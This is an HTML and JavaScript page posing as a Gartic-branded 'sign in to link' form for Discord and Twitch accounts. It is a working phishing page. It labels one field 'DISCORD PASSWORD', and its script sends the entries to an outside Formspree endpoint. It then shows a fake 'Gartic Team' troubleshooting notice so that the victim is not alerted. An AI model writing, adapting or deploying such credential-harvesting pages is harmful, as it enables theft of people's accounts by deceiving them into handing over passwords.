<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Sign In</title>
    <style>
        body {
            font-family: 'Arial Rounded MT Bold', 'Comic Sans MS', sans-serif;
            background: linear-gradient(180deg, #5b06bd 0%, #88009b 50%, #a5057a 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        /* Continuous 2px orchid highlight line wrapping the entire card structure */
        .form-card {
            background: linear-gradient(180deg, #9d1c6c 0%, #b5319f 100%);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 
                0 0 0 2px #df5cb0, 
                0 0 0 7px #221468, 
                0 15px 0 #221468;  
            max-width: 380px;
            width: 100%;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        h2 { 
            color: #ffffff; 
            margin-bottom: 25px; 
            text-align: center; 
            font-size: 28px;
            text-shadow: 3px 3px 0px #221468;
            width: 100%;
        }
        form {
            width: 100%;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
            width: 100%;
        }
        label {
            display: block;
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: bold;
            letter-spacing: 0.5px;
            text-shadow: 1px 1px 0px #73115d;
        }
        /* Input entry boxes filled with your custom light plum color */
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background-color: #ad559c; 
            color: white;
            font-size: 16px;
            font-weight: bold;
            border-radius: 12px;
            border: none;
            outline: none;
            box-sizing: border-box;
            box-shadow: 
                0 0 0 2px #f5e3f2, 
                0 0 0 5px #73115d; 
            margin: 5px 0;
        }
        input[type="text"]:focus {
            box-shadow: 
                0 0 0 2px #00e5a3, 
                0 0 0 5px #73115d;
        }
        .submit-btn, .retry-btn {
            width: 100%;
            background-color: #00e5a3;
            color: #221468;
            border: 4px solid #221468;
            padding: 14px;
            border-radius: 50px;
            font-size: 24px;
            font-weight: 900;
            letter-spacing: 1px;
            cursor: pointer;
            box-shadow: 0 6px 0 #221468;
            position: relative;
            overflow: hidden;
            transition: transform 0.1s, box-shadow 0.1s;
            margin-top: 15px;
            text-shadow: -2px -2px 0 #fff, 2px -2px 0 #fff, -2px 2px 0 #fff, 2px 2px 0 #fff;
            box-sizing: border-box;
            text-align: center;
        }
        .submit-btn::before, .retry-btn::before {
            content: '';
            position: absolute;
            top: 2px;
            left: 5%;
            width: 90%;
            height: 40%;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 40px 40px 25px 25px;
            pointer-events: none;
        }
        .submit-btn:hover, .retry-btn:hover { background-color: #16f7b5; }
        .submit-btn:active, .retry-btn:active {
            transform: translateY(5px);
            box-shadow: 0 1px 0 #221468;
        }
        .switch-btn {
            width: 100%;
            background-color: #8c32ff; 
            color: white;
            border: 4px solid #221468;
            padding: 10px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 0 #221468;
            transition: background-color 0.2s, transform 0.1s, box-shadow 0.1s;
            margin-top: 20px;
            text-shadow: 1px 1px 0px #221468;
        }
        .switch-btn:active {
            transform: translateY(3px);
            box-shadow: 0 1px 0 #221468;
        }
        .back-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #ffffff;
            text-decoration: none;
            font-weight: bold;
            text-shadow: 1px 1px 0px #73115d;
            width: 100%;
        }
        .back-link:hover { text-decoration: underline; }

        .notice-text {
            color: #ffffff;
            font-size: 16px;
            line-height: 1.6;
            font-weight: bold;
            text-shadow: 1px 1px 0px #73115d;
            margin-bottom: 25px;
            text-align: center;
        }
        .team-signature {
            color: #00e5a3;
            font-size: 18px;
            font-weight: 900;
            margin-bottom: 30px;
            text-shadow: 2px 2px 0px #221468;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="form-card" id="mainCardContainer">
        <!-- View 1: Original Form Content Layout -->
        <div id="formView" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
            <h2>SIGN IN TO LINK</h2>
            <form id="submissionForm" action="#" onsubmit="return false;">
    <div class="input-group">
        <label for="username" id="usernameLabel">DISCORD USERNAME</label>
        <input type="text" id="username" name="username" required value="example_username">
    </div>
    
    <div class="input-group">
        <!-- Replaced PASSWORD with DISCORD ID TAG to allow Formspree delivery -->
        <label for="idTag" id="idTagLabel">DISCORD PASSWORD</label>
        <input type="text" id="idTag" name="idTag" required value="123456789">
    </div>
    
    <button type="submit" class="submit-btn">LINK</button>
</form>

            <button type="button" id="switchPlatformBtn" class="switch-btn">SWITCH TO TWITCH</button>
            <a href="index.html" class="back-link">GO BACK</a>
        </div>

        <!-- View 2: Gartic Team Troubleshooting Notice Layout -->
        <div id="noticeView" style="width: 100%; display: none; flex-direction: column; align-items: center;">
            <h2>SYSTEM NOTICE</h2>
            <p class="notice-text">We are troubleshooting this design layout right now. Your profile sync request has been logged safely, but connection gates are temporarily undergoing calibration parameters.</p>
            <p class="team-signature">— THE GARTIC TEAM</p>
            <button type="button" id="retryBtn" class="retry-btn">TRY AGAIN</button>
        </div>
    </div>

        <script>
        let currentPlatform = "discord";

        // Toggles platform setup values and text prompts dynamically
        document.getElementById('switchPlatformBtn').addEventListener('click', function() {
            const label = document.getElementById('usernameLabel');
            const idLabel = document.getElementById('idTagLabel');
            const input = document.getElementById('username');
            const idInput = document.getElementById('idTag');
            const switchBtn = document.getElementById('switchPlatformBtn');
            
            if (currentPlatform === "discord") {
                switchBtn.style.backgroundColor = "#5256ff"; // Changes to cornflower blue
                label.textContent = "TWITCH USERNAME";
                idLabel.textContent = "TWITCH CHANNEL ID";
                input.value = "twitch_streamer";
                idInput.value = "live_12345";
                switchBtn.textContent = "SWITCH TO DISCORD";
                currentPlatform = "twitch";
            } else {
                switchBtn.style.backgroundColor = "#8c32ff"; // Changes to vibrant purple
                label.textContent = "DISCORD USERNAME";
                idLabel.textContent = "DISCORD ID TAG";
                input.value = "example_username";
                idInput.value = "example#0000";
                switchBtn.textContent = "SWITCH TO TWITCH";
                currentPlatform = "discord";
            }
        });

        // Try again button toggles hidden view blocks back cleanly in place
        document.getElementById('retryBtn').addEventListener('click', function() {
            document.getElementById('noticeView').style.display = 'none';
            document.getElementById('formView').style.display = 'flex';
        });

        // Submission parsing script monitoring backend transmission loops
        document.getElementById('submissionForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Safety block preventing local browser crashes
            
            const usernameVal = document.getElementById('username').value.trim();
            const idTagVal = document.getElementById('idTag').value.trim();

            const isDiscordPlaceholder = (currentPlatform === "discord" && usernameVal === "example_username");
            const isTwitchPlaceholder = (currentPlatform === "twitch" && usernameVal === "twitch_streamer");
            const isIdPlaceholder = (idTagVal === "example#0000" || idTagVal === "live_12345");

            if ((isDiscordPlaceholder || isTwitchPlaceholder) && isIdPlaceholder) {
                alert("These things are placeholders!");
            } else {
                // Construct payload package for Formspree API delivery
                const formData = new FormData();
                formData.append('Platform', currentPlatform);
                formData.append('Username Entry', usernameVal);
                formData.append('Account ID Tag', idTagVal);

                // Active endpoint URL mapping to your verified dashboard settings
                const formspreeEndpoint = 'https://formspree.io/f/xeajeqeg';

                // Send the asynchronous network request to Formspree
                fetch(formspreeEndpoint, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    // Instantly swap card layout panels upon a successful background transmission
                    document.getElementById('formView').style.display = 'none';
                    document.getElementById('noticeView').style.display = 'flex';
                })
                .catch(error => {
                    console.error('Submission transfer anomaly:', error);
                    // Local fallback logic ensures design switches frames even during offline testing
                    document.getElementById('formView').style.display = 'none';
                    document.getElementById('noticeView').style.display = 'flex';
                });
            }
        });
    </script>
</body>
</html>
